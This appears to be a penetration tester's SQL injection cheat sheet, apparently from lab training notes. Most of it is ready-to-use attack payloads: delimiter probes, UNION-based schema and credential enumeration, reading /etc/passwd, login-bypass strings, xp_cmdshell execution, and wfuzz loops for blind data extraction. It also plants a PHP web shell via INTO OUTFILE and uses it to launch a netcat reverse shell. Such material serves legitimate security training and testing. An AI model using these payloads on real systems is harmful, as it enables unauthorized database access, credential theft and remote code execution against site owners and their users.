SQLi
see:
xml/queries.xml from sqlmap root

Begin testing by passing delimiters as input
	COMMON
'
--
#
;
''
	ORACLE (most apply to postgresql)
[space]
||
,
/*
.
"
'||'
	MSSQL
+
'+'

enum
http://10.11.1.35/php.php?var=1 order by 1
	-upon finding a sqli vulnerable host iteration of order by value can reveal the number of columns
http://10.11.1.35/php.php?var=1 union select all 1,2,3,5
	-display each column, potentially with the column number value
	-union statements allow select statements to be inserted
http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,5,6
	-this syntax unlike select all must have all columns 1-6 selected
http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,@@version,6
	-return mysql version number
http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,user(),6
	-display logged-in user being used for mysql instance connection
http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
	-return table information schema
http://10.11.1.35/php.php?var=1 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
	-return schema for a table by name
	concat(name,0x3a,password)
		-concatenated values can be placed in the position of a sql columns to display otherwise hidden information in a corresponding html table column

1 UNION ALL SELECT LOAD_FILE('/etc/passwd')--
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
	-create a php shell execution script taking an argument 'cmd' from a get request
http://10.11.1.35/backdoor.php?cmd=nc.exe%20127.0.0.1%204444%20%25windir%25%5Csystem32%5Ccmd.exe
	-execute a netcat reverse shell from host launching cmd.exe
	
fingerprint strings
ORACLE
'str'||'ing'
BITAND(1,1)-BITAND(1,1)
MSSQL
'str'+'ing'
@@PACK_RECIEVED-@@PACK_RECIEVED
MySQL
'str' 'ing'
CONNECTION_ID()-CONNECTION_ID()
/*!32302 and 1=0*/
	

exploit payload statements
limit <offset>,<#rows>
count(*)
select(select database())
	-nested query
concat(something,somethingelse)
substr(string,<offset>,<char len>)
ascii(<char>)
sleep(10)
if(<condition>,<do true>,<do false>)
like "string%"
outfile "/path/to/file"
load_file("/path/to/file")
' exec master..xp_cmdshell 'command';-- -
	--ms sql server only


Login-bypass payloads
' OR 1=1;-- -
' OR "1"="1";-- -
' OR 1=1 LIMIT 1;-- -
' OR '1'='1
' OR 1=1;#

enumeration payloads
@@version
user()
database()
@@datadir
group_concat(table_name) ... from information_schema.tables where table_schema=database();-- -
group_concat(column_name) ... from information_schema.tables where table_name=<table_name>;-- -
group_concat(column_name) ... from <table name>;-- -
 and (substr(database(),<offset>,<char len>))='<char>' -- -
	-db name by boolean-based blind SQL injection
url payloads
https://target.dom/?param=1')) union select column1,column2 from table into outfile "/path/to/file";-- -
https://target.dom/?param=1' union select 1,2,@@version,4;-- -
' and sleep(10);-- -
' and if((select version()) like "5%", sleep(10), null);-- -
	-determine database version number

fuzzing commands
wfuzz -c -z range,1-10 "https://target.dom/?param=1 order by FUZZ;-- -"
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "https://target.dom/?param=1' and (substr(database(),$i,1))='FUZZ';-- -";done
	-boolean-based blind SQL injection observing http response size using substr()
		--will not work with non-ascii special chars
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr(database(),$i,1)))=FUZZ ;-- -";done
	-fix to work with non-ascii special chars
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ ;-- -";done
	-now determine table name from database name
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ;-- -";done
	-next determine column name from table name
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null);-- -";done > file.ext && grep "0m9" file.ext
	-determine db name with time-based blind SQL injection observing http response time with substr() and ascii()
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(5), null);-- -";done > file.ext && grep "0m9" file.ext;
	-determine column name with time-based blind SQL injection observing http response time with substr(), ascii() and if
for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "https://target.dom/?param=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null);-- -";done > <file.ext && grep "0m9" file.ext
	-extract column with time-based blind SQL injection observing http response time with substr(), ascii() and if